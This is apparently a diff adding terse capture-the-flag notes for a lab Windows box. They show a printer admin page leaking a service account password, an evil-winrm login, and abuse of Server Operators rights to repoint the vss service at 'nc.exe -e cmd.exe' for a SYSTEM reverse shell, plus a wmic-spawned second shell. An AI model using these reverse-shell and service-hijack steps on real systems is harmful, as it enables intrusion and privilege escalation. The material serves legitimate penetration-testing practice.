@@ -1,0 +1,130 @@
+
+
+
+Printer (web) allows connection to our box.
+
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 389            
+listening on [any] 389 ...
+connect to [10.10.14.2] from (UNKNOWN) [10.10.11.108] 56106
+0*`%return\svc-printer�
+                       1edFg43012!!ls
+^C
+                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ evil-winrm -i 10.10.11.108 -u svc-printer -p 1edFg43012!!                   
+                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'        
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                        
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\svc-printer\Documents> ls
+*Evil-WinRM* PS C:\Users\svc-printer\Documents> cd ..
+*Evil-WinRM* PS C:\Users\svc-printer> cd Desktop
+*Evil-WinRM* PS C:\Users\svc-printer\Desktop> ls
+
+
+    Directory: C:\Users\svc-printer\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        8/13/2025   4:06 AM             34 user.txt
+
+
+We can start/stop services as part of the Server Operators group.
+
+
+*Evil-WinRM* PS C:\Users\svc-printer\Downloads> upload ../../usr/share/windows-resources/binaries/nc.exe
+                                        
+Info: Uploading /home/kali/../../usr/share/windows-resources/binaries/nc.exe to C:\Users\svc-printer\Downloads\nc.exe                                                                                                                   
+                                        
+Data: 79188 bytes of 79188 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\svc-printer\Downloads> sc.exe config vss binPath="C:\Users\svc-printer\Downloads\nc.exe -e cmd.exe 10.10.14.2 1234"
+[SC] ChangeServiceConfig SUCCESS
+*Evil-WinRM* PS C:\Users\svc-printer\Downloads> sc.exe stop vss
+[SC] ControlService FAILED 1062:
+
+The service has not been started.
+
+*Evil-WinRM* PS C:\Users\svc-printer\Downloads> sc.exe start vss
+[SC] StartService FAILED 1053:
+
+The service did not respond to the start or control request in a timely fashion.
+
+
+
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [10.10.14.2] from (UNKNOWN) [10.10.11.108] 56136
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>cd ../../../Users/Administrator/Desktop
+cd ../../../Users/Administrator/Desktop
+
+C:\Users\Administrator\Desktop>more root.txt
+more root.txt
+3c96a1d5b4cc44e158a07ba42a465914
+
+C:\Users\Administrator\Desktop>
+
+
+
+=======================================
+IMPORTANT
+=======================================
+
+
+This writeup calls for an mfsvenom payload for persistence, 
+as the shell dies quickly with the process.
+Instead...
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [10.10.14.2] from (UNKNOWN) [10.10.11.108] 56181
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>wmic process call create "C:\Users\svc-printer\Downloads\nc.exe -e cmd.exe 10.10.14.2 4444"
+wmic process call create "C:\Users\svc-printer\Downloads\nc.exe -e cmd.exe 10.10.14.2 4444"
+Executing (Win32_Process)->Create()
+Method execution successful.
+Out Parameters:
+instance of __PARAMETERS
+{
+        ProcessId = 4104;
+        ReturnValue = 0;
+};
+
+
+C:\Windows\system32>cd..
+cd ..
+this shell is dead with the process
+
+
+┌──(kali㉿kali)-[~]
+└─$ nc -nvlp 4444                                                   
+listening on [any] 4444 ...
+connect to [10.10.14.2] from (UNKNOWN) [10.10.11.108] 56182
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>dir
+...
+C:\>this shell lives
+this shell lives
+'this' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\>
+
